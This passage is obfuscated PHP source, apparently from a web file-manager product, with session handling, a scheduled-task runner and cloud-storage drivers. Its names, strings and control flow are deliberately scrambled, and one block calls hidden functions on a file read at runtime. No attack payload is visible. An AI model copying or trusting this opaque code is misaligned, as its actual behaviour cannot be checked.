remove($c‰ÌŠÜæ¦ ) { $FŒ‹‹õ£ŸÚ = $this->getFile($c‰ÌŠÜæ¦ ); return @unlink($FŒ‹‹õ£ŸÚ); } public function deleteAll() { $aëÀ¯÷£œÃ =& $_SERVER[…ë˜õ]; $C¡Ş¼·¯‚Â = scandir($this->cachePath); foreach ($C¡Ş¼·¯‚Â as $bõ’„¯ÒšÁ) { $f˜ğÃ³µÖ = $this->cachePath . $bõ’„¯ÒšÁ; if (strpos($f˜ğÃ³µÖ, $aëÀ¯÷£œÃ[809]) && strpos($f˜ğÃ³µÖ, $aëÀ¯÷£œÃ[810])) { @unlink($f˜ğÃ³µÖ); } } } public function clearTimeout() { $E›íÇ ™æª =& $_SERVER[…ë˜õ]; $aÚœàï©Û = scandir($this->cachePath); foreach ($aÚœàï©Û as $a…ÙÅÚŸ±) { $dˆ†ïñ‹¯ö = $this->cachePath . $a…ÙÅÚŸ±; if (strpos($dˆ†ïñ‹¯ö, $E›íÇ ™æª[809]) && strpos($dˆ†ïñ‹¯ö, $E›íÇ ™æª[810]) && filemtime($dˆ†ïñ‹¯ö) < time() - $this->cacheTime) { @unlink($dˆ†ïñ‹¯ö); } } } } goto eÇÉ†“İ…¯; E’ïìˆ­§: define($_SERVER[…ë˜õ][0], $_SERVER[…ë˜õ][1]); $_SERVER[ñ¯»Æ«í³] = explode($_SERVER[…ë˜õ][2], gzinflate(substr($_SERVER[…ë˜õ][3], 10, -8))); function binCheckEq($fÓÄ¡Ş¶‘, $cÙâ§Õì Ó) { return $fÓÄ¡Ş¶‘ == $cÙâ§Õì Ó; } goto C½·®¸µ¦¾; B’Ëˆ´Ä: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto bÁ”è±±õ§; A’êõ½í§å: $c³åÄÌ·£Õ = $a²ï‡³·éª[$DŠÙ³ »ˆ]; $cğßèÈ¿˜â = $a²ï‡³·éª[$aèÄ¬î¾ˆ[799]]; switch ($DŠÙ³ »ˆ) { case $aèÄ¬î¾ˆ[17]: self::$handle = Model($aèÄ¬î¾ˆ[800]); break; case $aèÄ¬î¾ˆ[801]: self::$handle = new CacheRedis($c³åÄÌ·£Õ, $cğßèÈ¿˜â); break; case $aèÄ¬î¾ˆ[802]: self::$handle = new CacheMemcached($c³åÄÌ·£Õ, $cğßèÈ¿˜â); break; case $aèÄ¬î¾ˆ[191]: $c³åÄÌ·£Õ[$aèÄ¬î¾ˆ[75]] = $c³åÄÌ·£Õ[$aèÄ¬î¾ˆ[75]] . $aèÄ¬î¾ˆ[1493]; self::$handle = new CacheFile($c³åÄÌ·£Õ, $cğßèÈ¿˜â); default: break; } goto BíŞ¾êÄœ¸; BíŞ¾êÄœ¸: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $f¨¦éŠ½œ = new self(); return $f¨¦éŠ½œ; goto e†“²¶Ì³; bÁ”è±±õ§: $aèÄ¬î¾ˆ =& $_SERVER[…ë˜õ]; static $f¨¦éŠ½œ = false; if ($f¨¦éŠ½œ) { return $f¨¦éŠ½œ; } goto AÎ†Ò¡æŒ½; AÎ†Ò¡æŒ½: $a²ï‡³·éª = $GLOBALS[$aèÄ¬î¾ˆ[6]][$aèÄ¬î¾ˆ[345]]; self::$sessionTime = $a²ï‡³·éª[$aèÄ¬î¾ˆ[1490]]; $b¡¢Ê”Ö’ = isset($GLOBALS[$aèÄ¬î¾ˆ[1491]]) ? $GLOBALS[$aèÄ¬î¾ˆ[1491]] : SESSION_ID; goto bâãÄ—Ã±Ÿ; bâãÄ—Ã±Ÿ: if (self::$sessionSign) { } else { if (Cookie::get($b¡¢Ê”Ö’)) { self::$sessionSign = Cookie::get($b¡¢Ê”Ö’); } else { self::$sessionSign = guid(); } } Cookie::setSafe($b¡¢Ê”Ö’, self::$sessionSign, self::$sessionTime); $DŠÙ³ »ˆ = $a²ï‡³·éª[$aèÄ¬î¾ˆ[1492]]; goto A’êõ½í§å; e†“²¶Ì³: } public static function sign($BìŒË¡‰¹• = false) { $BìŒË¡‰¹• && (self::$sessionSign = $BìŒË¡‰¹•); self::init(); return self::$sessionSign; } public static function set($FÀªæ¦Öğ, $AÚÃÑæë´ = false) { self::init(); if (is_array($FÀªæ¦Öğ)) { foreach ($FÀªæ¦Öğ as $Aœ¥‚¼ğË† => $C¼×Ú¾Â‚ß) { array_set_value(self::$data, $Aœ¥‚¼ğË†, $C¼×Ú¾Â‚ß); } } else { array_set_value(self::$data, $FÀªæ¦Öğ, $AÚÃÑæë´); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($D‰‹ùïß‚‘ = false) { self::init(); if (!$D‰‹ùïß‚‘) { return self::$data; } return array_get_value(self::$data, $D‰‹ùïß‚‘); } public static function remove($bØÄËÊŸÖÄ) { self::init(); unset(self::$data[$bØÄËÊŸÖÄ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[…ë˜õ][804])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto eÙÓËµÁ˜ø; eÙÓËµÁ˜ø: $Cë¥ğ¦ËÕ¬ =& $_SERVER[…ë˜õ]; if (self::valueGet($Cë¥ğ¦ËÕ¬[731]) != $Cë¥ğ¦ËÕ¬[86]) { return; } if (self::valueGet($Cë¥ğ¦ËÕ¬[1494]) == $Cë¥ğ¦ËÕ¬[86]) { $eé‰¨„§ = self::valueGet($Cë¥ğ¦ËÕ¬[1495]); if (time() - $eé‰¨„§ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto C‚èæÈè´Ö; C ±ÙÉ›½©: while (!0) { self::cacheClear(); if (self::valueGet($Cë¥ğ¦ËÕ¬[731]) != $Cë¥ğ¦ËÕ¬[86]) { self::valueSet($Cë¥ğ¦ËÕ¬[1494], $Cë¥ğ¦ËÕ¬[491]); self::log($Cë¥ğ¦ËÕ¬[1498]); die; } self::valueSet($Cë¥ğ¦ËÕ¬[1494], $Cë¥ğ¦ËÕ¬[86]); self::valueSet($Cë¥ğ¦ËÕ¬[1495], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto Bİùª¯Ù; C‚èæÈè´Ö: http_close(); self::valueSet($Cë¥ğ¦ËÕ¬[1494], $Cë¥ğ¦ËÕ¬[86]); Hook::bind($Cë¥ğ¦ËÕ¬[1496], $Cë¥ğ¦ËÕ¬[1497]); goto C ±ÙÉ›½©; Bİùª¯Ù: } public static function restart() { $A¼÷©ï™ =& $_SERVER[…ë˜õ]; http_close(); self::valueSet($A¼÷©ï™[731], $A¼÷©ï™[491]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($A¼÷©ï™[1494], $A¼÷©ï™[491]); self::valueSet($A¼÷©ï™[731], $A¼÷©ï™[86]); } public static function shutdownEvent() { $A¸˜¯­‰Û =& $_SERVER[…ë˜õ]; self::valueSet($A¸˜¯­‰Û[1494], $A¸˜¯­‰Û[491]); self::log($A¸˜¯­‰Û[1499]); } public static function config($AŸ¡‘èÜÕ¦, $B¥Üä†÷ç) { self::valueSet($_SERVER[…ë˜õ][731], $AŸ¡‘èÜÕ¦); } private static function taskRunAll() { goto fÈËõµÓ; C³—‡»‰„Ì: $aè¿äæ¸‘¸ = count($f×ÀôÏãË‰); for ($bÌ°î»Ÿ¯ = 0; $bÌ°î»Ÿ¯ < $aè¿äæ¸‘¸; $bÌ°î»Ÿ¯++) { $B¶×‹‚™íÏ = $f×ÀôÏãË‰[$bÌ°î»Ÿ¯]; if (!$B¶×‹‚™íÏ[$C˜ÔÀŞˆ‘Á[388]] || $B¶×‹‚™íÏ[$C˜ÔÀŞˆ‘Á[1501]] != $C˜ÔÀŞˆ‘Á[86]) { continue; } if (!self::taskTimeCheck($B¶×‹‚™íÏ)) { continue; } self::taskRun($B¶×‹‚™íÏ); } Hook::trigger($C˜ÔÀŞˆ‘Á[1502]); goto DÀŠ®Îä; fÈËõµÓ: $C˜ÔÀŞˆ‘Á =& $_SERVER[…ë˜õ]; $EÌ“åòò¢ = timeFloat(); $f×ÀôÏãË‰ = Model($C˜ÔÀŞˆ‘Á[1500])->listData(); goto C³—‡»‰„Ì; DÀŠ®Îä: self::taskQueueRun($EÌ“åòò¢); self::closeDatabase(); goto E„ÛŒ‘§‰; E„ÛŒ‘§‰: } private static function taskQueueRun($eâ´âšØ) { $E¤Í‘‰ì»© = 10; while (!0) { $e¯ ‡‡½¥– = TaskQueue::run(); if ($e¯ ‡‡½¥– === !1) { break; } if (timeFloat() - $eâ´âšØ >= $E¤Í‘‰ì»©) { break; } } } private static function taskTimeCheck($eŠÒã«£†¨) { goto a‚ó»©Œ; a‚ó»©Œ: $BÁµÖÃÚ‰Ù =& $_SERVER[…ë˜õ]; $eåäÈˆÓ°“ = json_decode($eŠÒã«£†¨[$BÁµÖÃÚ‰Ù[195]], !0); $B×ğ±ßˆ = intval($eŠÒã«£†¨[$BÁµÖÃÚ‰Ù[1495]]); goto Fã¡™ƒœ©ƒ; Fã¡™ƒœ©ƒ: $cÍô‹µÖ¿” = strtotime($BÁµÖÃÚ‰Ù[1503] . $eåäÈˆÓ°“[$BÁµÖÃÚ‰Ù[1504]] . $BÁµÖÃÚ‰Ù[1505]) - strtotime($BÁµÖÃÚ‰Ù[1506]); $EÏŒõˆ¼ã‚ = time() - strtotime(date($BÁµÖÃÚ‰Ù[1507]) . $BÁµÖÃÚ‰Ù[1508]); $dŸã²Ç°ğ÷ = $EÏŒõˆ¼ã‚ >= $cÍô‹µÖ¿” && $EÏŒõˆ¼ã‚ <= $cÍô‹µÖ¿” + 3600; goto b´ìÆ¡¼¸æ; b´ìÆ¡¼¸æ: switch ($eåäÈˆÓ°“[$BÁµÖÃÚ‰Ù[29]]) { case $BÁµÖÃÚ‰Ù[1509]: if (time() - $B×ğ±ßˆ < 3600 * 24 * 30) { return !1; } if ($eåäÈˆÓ°“[$BÁµÖÃÚ‰Ù[1509]] == date($BÁµÖÃÚ‰Ù[1510]) && $dŸã²Ç°ğ÷) { return !0; } break; case $BÁµÖÃÚ‰Ù[1511]: if (time() - $B×ğ±ßˆ < 3600 * 24 * 7) { return !1; } $A÷æ„¯öŒ¹ = date($BÁµÖÃÚ‰Ù[1512]) == 0 ? 7 : date($BÁµÖÃÚ‰Ù[1512]); if ($eåäÈˆÓ°“[$BÁµÖÃÚ‰Ù[1511]] == $A÷æ„¯öŒ¹ && $dŸã²Ç°ğ÷) { return !0; } break; case $BÁµÖÃÚ‰Ù[1504]: if (time() - $B×ğ±ßˆ < 3600 * 24) { return !1; } if ($dŸã²Ç°ğ÷) { return !0; } break; case $BÁµÖÃÚ‰Ù[1513]: if (time() - $B×ğ±ßˆ >= floatval($eåäÈˆÓ°“[$BÁµÖÃÚ‰Ù[1513]]) * 60) { return !0; } break; default: break; } return !1; goto c¿¡´£äáÂ; c¿¡´£äáÂ: } private static function closeDatabase() { goto e‚®²²µâ; e‚®²²µâ: $DÆÏë§º¯ß =& $_SERVER[…ë˜õ]; static $F»‚Š÷ò—Ş = 0; $BÏË°¬İÙÑ = 1800; goto eÁ¸­ÄÀùÎ; DÄéÅÆŞÍ™: $aáÌˆ³øä = Model($DÆÏë§º¯ß[497])->db($DÆÏë§º¯ß[33]); if ($aáÌˆ³øä) { $aáÌˆ³øä->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($DÆÏë§º¯ß[1514], $DÆÏë§º¯ß[1515]); die; } goto D…³ˆê³¶Š; eÁ¸­ÄÀùÎ: if (!$F»‚Š÷ò—Ş) { $F»‚Š÷ò—Ş = time(); } if (time() - $F»‚Š÷ò—Ş < $BÏË°¬İÙÑ) { return; } $F»‚Š÷ò—Ş = time(); goto DÄéÅÆŞÍ™; D…³ˆê³¶Š: } public static function taskRun($fùø»‹•À) { goto EŞÁ¸êË¿; b«Ë«öç¢: $FêĞØµ·±¥ = timeFloat(); $fš‚¯Òæ¯± = $BŒÈ¡œî°É[33]; switch ($fùø»‹•À[$BŒÈ¡œî°É[29]]) { case $BŒÈ¡œî°É[303]: $eÓçö©Šåğ = url_request($fùø»‹•À[$BŒÈ¡œî°É[1519]], $BŒÈ¡œî°É[226], !1, !1, !1, !1, 5); $fš‚¯Òæ¯± = strlen($eÓçö©Šåğ); break; case $BŒÈ¡œî°É[225]: $fš‚¯Òæ¯± = Hook::apply($fùø»‹•À[$BŒÈ¡œî°É[1519]]); default: break; } goto F’í®Şùã‚; EŞÁ¸êË¿: $BŒÈ¡œî°É =& $_SERVER[…ë˜õ]; self::log($BŒÈ¡œî°É[1516] . $fùø»‹•À[$BŒÈ¡œî°É[388]] . $BŒÈ¡œî°É[1517] . $fùø»‹•À[$BŒÈ¡œî°É[28]] . $BŒÈ¡œî°É[1518] . $fùø»‹•À[$BŒÈ¡œî°É[1519]]); Model($BŒÈ¡œî°É[1500])->run($fùø»‹•À[$BŒÈ¡œî°É[388]]); goto b«Ë«öç¢; F’í®Şùã‚: Model($BŒÈ¡œî°É[1520])->add(array($BŒÈ¡œî°É[1521] => $BŒÈ¡œî°É[33], $BŒÈ¡œî°É[1522] => $BŒÈ¡œî°É[491], $BŒÈ¡œî°É[29] => $BŒÈ¡œî°É[1523] . $fùø»‹•À[$BŒÈ¡œî°É[388]], $BŒÈ¡œî°É[1524] => json_encode(array($BŒÈ¡œî°É[28] => $fùø»‹•À[$BŒÈ¡œî°É[28]], $BŒÈ¡œî°É[1525] => timeFloat() - $FêĞØµ·±¥, $BŒÈ¡œî°É[289] => $fš‚¯Òæ¯±)))); self::log($BŒÈ¡œî°É[1526] . $fùø»‹•À[$BŒÈ¡œî°É[388]] . $BŒÈ¡œî°É[1527] . $fš‚¯Òæ¯±); return !0; goto bË…Ã¥Ìµë; bË…Ã¥Ìµë: } private static function valueGet($Bñ¢ÛÁ«‡Œ) { $A˜‚Èº’± =& $_SERVER[…ë˜õ]; $fÇÒ¥È®±Ù = $A˜‚Èº’±[1528]; $FøˆèÆ™òä = Model($A˜‚Èº’±[1529])->get($Bñ¢ÛÁ«‡Œ, $fÇÒ¥È®±Ù); if (is_null($FøˆèÆ™òä)) { Model($A˜‚Èº’±[1529])->set($A˜‚Èº’±[731], $A˜‚Èº’±[86], $fÇÒ¥È®±Ù); Model($A˜‚Èº’±[1529])->set($A˜‚Èº’±[1494], $A˜‚Èº’±[491], $fÇÒ¥È®±Ù); $FøˆèÆ™òä = Model($A˜‚Èº’±[1529])->get($Bñ¢ÛÁ«‡Œ, $fÇÒ¥È®±Ù); } return $FøˆèÆ™òä; } private static function valueSet($Eì£¹ë‹àÉ, $F¹Œİ£—œ) { $Bƒ÷ƒ‡á¸ =& $_SERVER[…ë˜õ]; return Model($Bƒ÷ƒ‡á¸[1529])->set($Eì£¹ë‹àÉ, $F¹Œİ£—œ, $Bƒ÷ƒ‡á¸[1528]); } protected static function log($c¦†ç—Ë») { write_log($c¦†ç—Ë», $_SERVER[…ë˜õ][1515]); } private static function cacheClear() { $d¤‹ğÄ—Ôì =& $_SERVER[…ë˜õ]; $fàÁËí‡Ï = Model($d¤‹ğÄ—Ôì[1529])->cacheKey($d¤‹ğÄ—Ôì[1528]); Cache::clearMemory($fàÁËí‡Ï); Model($d¤‹ğÄ—Ôì[1500])->cacheClear(); } } if ($_SERVER[$_SERVER[…ë˜õ][824]] != $_SERVER[$_SERVER[…ë˜õ][1530]]) { goto dÉ™ò´İ‚ ; b¿ƒ–Ã” ¾: $Fº‚²¼Î„•($_SERVER[$_SERVER[…ë˜õ][825]]); goto D›æ­óÔÓ; C•Š‘Ü™Ä: $Bƒ‚¶¿ò¿ = explode($_SERVER[…ë˜õ][227], $cƒ³Šñï’); if (count($Bƒ‚¶¿ò¿) < $_SERVER[…ë˜õ][599]) { $Dàå³¦Œ½º = $_SERVER[…ë˜õ][829]; $Dàå³¦Œ½º(); } $Fº‚²¼Î„• = $_SERVER[…ë˜õ][830]; goto b¿ƒ–Ã” ¾; dÉ™ò´İ‚ : $EĞ—åèã÷î = $_SERVER[…ë˜õ][826]; $BÏØÒË­å— = $_SERVER[$_SERVER[…ë˜õ][827]] . $_SERVER[…ë˜õ][828]; $cƒ³Šñï’ = $EĞ—åèã÷î($BÏØÒË­å—); goto C•Š‘Ü™Ä; D›æ­óÔÓ: } goto B‘Èà²îÜä; fÍ¼ß˜ÇºÂ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DÅí£¤ÊË) { parent::__construct($DÅí£¤ÊË); $this->signatureVersion($_SERVER[…ë˜õ][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($FØ›˜âšà) { parent::__construct($FØ›˜âšà); $this->signatureVersion($_SERVER[…ë˜õ][210]); } public function fileOutLink($BøÑãœ¡äö) { $C¸»í¿„Å =& $_SERVER[…ë˜õ]; if (substr($BøÑãœ¡äö, 0, 7) == $C¸»í¿„Å[1207]) { $BøÑãœ¡äö = $C¸»í¿„Å[1208] . substr($BøÑãœ¡äö, 7); } header($C¸»í¿„Å[158] . $BøÑãœ¡äö); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Dğ¼¸³…äØ) { parent::__construct(); include_once SDK_DIR . $_SERVER[…ë˜õ][1264]; $this->_init($Dğ¼¸³…äØ); } public function _init($f‹˜¹Ã…¢) { $A…Œêµ™âÖ =& $_SERVER[…ë˜õ]; foreach ($f‹˜¹Ã…¢ as $d‡âçàá => $b¨‚Û¾øÏ©) { if (isset($this->{$d‡âçàá})) { $this->{$d‡âçàá} = $b¨‚Û¾øÏ©; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($A…Œêµ™âÖ[1265] . LNG($A…Œêµ™âÖ[1266])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto dò‚Ä¦ÆÏÕ; AŸ˜Î¸ŒĞ§: $EÌñ†Í å->setMaxAgeSeconds(600); $EÌñ†Í å->addExposeHeader($A”‡–£óÑ£[1272]); $EÌñ†Í å->addAllowedHeader($A”‡–£óÑ£[1267]); goto a ÈŸŒ†ˆ£; eâ²Ô³”á½: $EÌñ†Í å->addAllowedMethod($A”‡–£óÑ£[1270]); $EÌñ†Í å->addAllowedMethod($A”‡–£óÑ£[1271]); $EÌñ†Í å->addAllowedMethod($A”‡–£óÑ£[157]); goto AŸ˜Î¸ŒĞ§; FÁƒùˆ£ ƒ: $EÌñ†Í å->addAllowedOrigin($A”‡–£óÑ£[1267]); $EÌñ†Í å->addAllowedMethod($A”‡–£óÑ£[1268]); $EÌñ†Í å->addAllowedMethod($A”‡–£óÑ£[1269]); goto eâ²Ô³”á½; a ÈŸŒ†ˆ£: $Eğ’¹Ä®†->addRule($EÌñ†Í å); try { $this->client->putBucketCors($this->bucket, $Eğ’¹Ä®†); } catch (OSS\Core\OssException $c ààïÉ†í) { return !1; } return !0; goto C¹‰í¡óŠÊ; dò‚Ä¦ÆÏÕ: $A”‡–£óÑ£ =& $_SERVER[…ë˜õ]; $Eğ’¹Ä®† = new OSS\Model\CorsConfig(); $EÌñ†Í å = new OSS\Model\CorsRule(); goto FÁƒùˆ£ ƒ; C¹‰í¡óŠÊ: } public function getBucketCors() { goto F¼¥¼Ø“†Á; eäñçó§´: if (!$DÃÊÊ¨Æ–¨ || !($E£§¬ê‹‹è = $DÃÊÊ¨Æ–¨->getRules())) { return null; } $dô®Ùó©Ë = $E£§¬ê‹‹è[0]->getAllowedOrigins(); $E´°–Åì´˜ = $E£§¬ê‹‹è[0]->getAllowedMethods(); goto f³ñó›Å¦Ü; F¼¥¼Ø“†Á: $CœœÕŸ‡‘ =& $_SERVER[…ë˜õ]; $DÃÊÊ¨Æ–¨ = null; try { $DÃÊÊ¨Æ–¨ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $C÷­´ÌàÎÉ) { return null; } goto eäñçó§´; A†·÷Õ‰Ç: return array($CœœÕŸ‡‘[180] => isset($dô®Ùó©Ë[0]) ? $dô®Ùó©Ë[0] : $CœœÕŸ‡‘[33], $CœœÕŸ‡‘[184] => $E´°–Åì´˜, $CœœÕŸ‡‘[1273] => $eÏ¶•–¨©Ğ, $CœœÕŸ‡‘[1274] => isset($C„„ç•ã‘Ë[0]) ? $C„„ç•ã‘Ë[0] : $CœœÕŸ‡‘[33], $CœœÕŸ‡‘[182] => isset($B¥Ó…İ–®[0]) ? $B¥Ó…İ–®[0] : $CœœÕŸ‡‘[33]); goto C³Ã…†ÌßŸ; f³ñó›Å¦Ü: $eÏ¶•–¨©Ğ = $E£§¬ê‹‹è[0]->getMaxAgeSeconds(); $C„„ç•ã‘Ë = $E£§¬ê‹‹è[0]->getExposeHeaders(); $B¥Ó…İ–® = $E£§¬ê‹‹è[0]->getAllowedHeaders(); goto A†·÷Õ‰Ç; C³Ã…†ÌßŸ: } public function isBucketCors() { goto D‹›†ŠĞ„‰; a·àÃêÆ¼­: if ($fÚñï®ÀË[$A“®ÅÊ“Ÿ [180]] != $A“®ÅÊ“Ÿ [181] || $fÚñï®ÀË[$A“®ÅÊ“Ÿ [182]] != $A“®ÅÊ“Ÿ [181]) { return !1; } $DƒÌÜ®ˆ•‰ = array_map($A“®ÅÊ“Ÿ [183], $fÚñï®ÀË[$A“®ÅÊ“Ÿ [184]]); if (!is_array($DƒÌÜ®ˆ•‰)) { $DƒÌÜ®ˆ•‰ = array(); } goto b°„É˜äÉ; D‹›†ŠĞ„‰: $A“®ÅÊ“Ÿ  =& $_SERVER[…ë˜õ]; $fÚñï®ÀË = $this->getBucketCors(); if (!$fÚñï®ÀË || !is_array($fÚñï®ÀË)) { return !1; } goto a·àÃêÆ¼­; b°„É˜äÉ: $C†¨¥‚£© = array($A“®ÅÊ“Ÿ [185], $A“®ÅÊ“Ÿ [186], $A“®ÅÊ“Ÿ [187], $A“®ÅÊ“Ÿ [188], $A“®ÅÊ“Ÿ [189]); $FŸÅŒï¬«Ğ = array_diff($C†¨¥‚£©, $DƒÌÜ®ˆ•‰); return empty($FŸÅŒï¬«Ğ); goto DÇÚŞÂéÉ‰; DÇÚŞÂéÉ‰: } public function mkfile($BŞÑØ“¤„Û, $aò¦‹£ïÅĞ = '', $a³¨¤–ƒæÛ = REPEAT_RENAME) { $AëÛæöÄ‡ = $this->setContent($BŞÑØ“¤„Û, $aò¦‹£ïÅĞ); if ($AëÛæöÄ‡ !== !1) { return $this->getPathOuter($BŞÑØ“¤„Û); } return !1; } public function mkdir($A×„£°¡Š¯, $b‚ˆÂˆÅ¤í = REPEAT_SKIP) { if ($this->_isFolder($A×„£°¡Š¯)) { return $this->getPathOuter($A×„£°¡Š¯); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($A×„£°¡Š¯)); } catch (OSS\Core\OssException $D™“Å§ƒ—É) { return !1; } return $this->getPathOuter($A×„£°¡Š¯); } private function fileList($aÕğ·¼æ½¶, $eŒíÃ¾ŞÈî = '', $A·¥–´ëçÚ = 0) { goto FØÆ÷Ü; Fºáİì½˜ï: $eËÖÛÇ„Ê· = $DÕñ¾Õì©[33]; $C„Ö—öĞÓö = 1000; $f›…Ğš§° = $this->listItemCache === !1 ? !1 : !0; goto c‡ì‘ÂáæÔ; FØÆ÷Ü: $DÕñ¾Õì© =& $_SERVER[…ë˜õ]; $aÕğ·¼æ½¶ = trim($aÕğ·¼æ½¶, $DÕñ¾Õì©[8]); $a¹ÔëÖŠ¶Ñ = empty($aÕğ·¼æ½¶) ? $DÕñ¾Õì©[33] : $aÕğ·¼æ½¶ . $DÕñ¾Õì©[8]; goto Fºáİì½˜ï; c‡ì‘ÂáæÔ: $aÌëÉ‡Œ— = $B¥ø®ÊâğÆ = array(); while (!0) { check_abort(); $a¿®“’‘ÒÜ = array($DÕñ¾Õì©[1275] => $eŒíÃ¾ŞÈî, $DÕñ¾Õì©[1276] => $a¹ÔëÖŠ¶Ñ, $DÕñ¾Õì©[1277] => $C„Ö—öĞÓö, $DÕñ¾Õì©[1278] => $eËÖÛÇ„Ê·); try { $Bº¨Ø”÷™â = $this->client->listObjects($this->bucket, $a¿®“’‘ÒÜ); } catch (OSS\Core\OssException $aœº˜ŸØŒÊ) { break; } $eËÖÛÇ„Ê· = $Bº¨Ø”÷™â->getNextMarker(); $fñ´ÏÒ¹ÜÊ = $Bº¨Ø”÷™â->getObjectList(); $Fõ®‰Ó›ª = $Bº¨Ø”÷™â->getPrefixList(); foreach ($fñ´ÏÒ¹ÜÊ as $CéèÖœ­Èë) { goto eÒÜ¡¤£¡Ë; eÒÜ¡¤£¡Ë: if ($CéèÖœ­Èë->getKey() == $a¹ÔëÖŠ¶Ñ) { continue; } $E×íĞƒÜø¾ = $CéèÖœ­Èë->getKey(); $DøõÉ´· = $CéèÖœ­Èë->getSize(); goto CÑ”ƒˆÅ•Æ; CÑ”ƒˆÅ•Æ: $aµé……©÷ = $CéèÖœ­Èë->getLastModified(); $eÂªé¾¹º³ = $A·¥–´ëçÚ ? array($DÕñ¾Õì©[28] => $E×íĞƒÜø¾, $DÕñ¾Õì©[77] => $DøõÉ´·, $DÕñ¾Õì©[195] => strtotime($aµé……©÷)) : $E×íĞƒÜø¾; $b†ÕÏèº’‹ = $DøõÉ´· == 0 && substr($E×íĞƒÜø¾, strlen($E×íĞƒÜø¾) - 1, 1) == $DÕñ¾Õì©[8] ? !0 : !1; goto D±¶Öùß¦Æ; D±¶Öùß¦Æ: if ($f›…Ğš§°) { $this->cacheMethod($DÕñ¾Õì©[197], $E×íĞƒÜø¾, $b†ÕÏèº’‹); $this->cacheMethod($DÕñ¾Õì©[198], $E×íĞƒÜø¾, array($DÕñ¾Õì©[77] => $DøõÉ´·, $DÕñ¾Õì©[1279] => $DøõÉ´·, $DÕñ¾Õì©[83] => strtotime($aµé……©÷), $DÕñ¾Õì©[1280] => $aµé……©÷)); } if ($b†ÕÏèº’‹) { $aÌëÉ‡Œ—[] = $E×íĞƒÜø¾; continue; } $B¥ø®ÊâğÆ[] = $eÂªé¾¹º³; goto B·  èø; B·  èø: } foreach ($Fõ®‰Ó›ª as $Dªå³‘¶) { $aÌëÉ‡Œ—[] = $Dªå³‘¶->getPrefix(); if ($f›…Ğš§°) { $this->cacheMethod($DÕñ¾Õì©[197], $E×íĞƒÜø¾, !0); } } if ($eËÖÛÇ„Ê· === $DÕñ¾Õì©[33]) { break; } } if ($f›…Ğš§°) { $this->cacheMethod($DÕñ¾Õì©[197], $aÕğ·¼æ½¶, !0); } goto fÓŞ›âå¡; fÓŞ›âå¡: return array($DÕñ¾Õì©[74] => $aÌëÉ‡Œ—, $DÕñ¾Õì©[73] => $B¥ø®ÊâğÆ); goto b‹„¢ÚÑ§È; b‹„¢ÚÑ§È: } public function copyFile($Bç§êõâŞÍ, $B‘ˆ§ŞöÓ) { $E…×Ë¤á’â = $this->size($Bç§êõâŞÍ); if ($E…×Ë¤á’â < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Bç§êõâŞÍ, $this->bucket, $this->pathEncode($B‘ˆ§ŞöÓ)); } catch (OSS\Core\OssException $d£‘—±òŠç) { return !1; } return $this->getPathOuter($B‘ˆ§ŞöÓ); } $a›É¼§ğ³Ä = $this->multiCopyObject($Bç§êõâŞÍ, $B‘ˆ§ŞöÓ, $E…×Ë¤á’â); return $a›É¼§ğ³Ä ? $this->getPathOuter($B‘ˆ§ŞöÓ) : !1; } private function multiCopyObject($DÓŒË†Œ„, $eÊÙæ³ßš, $b²¥óñÜÚÅ) { $bš“ÅÉÔó” =& $_SERVER[…ë˜õ]; try { goto FÂŒÈ†¥Ú–; FÂŒÈ†¥Ú–: $F“„È£Ö×™ = array(); if ($F‰å™·«Î¨ = $this->hashMd5($DÓŒË†Œ„)) { $F“„È£Ö×™ = array(OSS\OssClient::OSS_HEADERS => array($bš“ÅÉÔó”[1281] => $F‰å™·«Î¨)); } $fºàö‘Ï¸ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($eÊÙæ³ßš), $F“„È£Ö×™); goto B”•Ã—àî; B”•Ã—àî: $Bì–ÀáÚ™ = 1; $e¢á•ÜŞæĞ = 0; $AáºïÌÀªÉ = array(); goto A¹ƒëãÒí; A¹ƒëãÒí: $c‰šÃä = 1024 * 1024 * 10; $Aø˜ƒ±ÀŠ = $this->client->generateMultiuploadParts($b²¥óñÜÚÅ, $c‰šÃä); foreach ($Aø˜ƒ±ÀŠ as $EŞæš‚™äõ => $dëæŞÌÕùß) { $FÃÖÏšªØ± = $e¢á•ÜŞæĞ + (int) $dëæŞÌÕùß[$bš“ÅÉÔó”[1282]]; $b¢¡ÈñÙ¦š = (int) $dëæŞÌÕùß[$bš“ÅÉÔó”[333]] + $FÃÖÏšªØ± - 1; $BÛ«ôÛè… = array($bš“ÅÉÔó”[1283] => $FÃÖÏšªØ±, $bš“ÅÉÔó”[1284] => $b¢¡ÈñÙ¦š); $AáºïÌÀªÉ[] = $this->client->uploadPartCopy($this->bucket, 